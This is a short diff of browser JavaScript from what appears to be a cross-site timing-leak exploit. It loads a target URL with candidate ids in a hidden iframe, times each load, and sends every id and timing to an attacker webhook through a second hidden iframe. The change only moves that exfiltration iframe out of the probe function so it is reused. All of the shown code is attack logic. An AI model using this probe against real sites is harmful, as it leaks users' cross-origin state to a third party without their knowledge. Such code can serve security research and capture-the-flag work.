@@ -9,6 +9,10 @@ const iframe = document.createElement("iframe");
 iframe.style.display = "none";
 document.documentElement.appendChild(iframe);
 
+const ex = document.createElement("iframe");
+ex.style.display = "none";
+document.documentElement.appendChild(ex);
+
 function probe(id) {
     const start = performance.now();
 
@@ -17,10 +21,7 @@ function probe(id) {
 
         console.log("ID:", id, "TIME:", delta);
 
-        const ex = document.createElement("iframe");
         ex.src = WEBHOOK + "?id=" + id + "&t=" + delta;
-        ex.style.display = "none";
-        document.documentElement.appendChild(ex);
     };
 
     iframe.src = TARGET + id;
